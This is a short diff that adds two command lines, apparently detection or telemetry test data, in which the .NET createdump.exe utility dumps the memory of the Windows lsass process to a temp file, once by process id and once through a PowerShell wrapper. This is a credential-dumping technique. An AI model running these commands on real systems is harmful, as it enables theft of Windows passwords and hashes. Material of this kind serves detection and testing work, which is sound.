@@ -1,0 +1,2 @@
+"C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17\createdump.exe" -u -f C:\Users\thaim\AppData\Local\Temp\dotnet-lsass.dmp 788
+"powershell.exe" & {$exePath =  resolve-path \""$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe\"" & \""$exePath\"" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id}
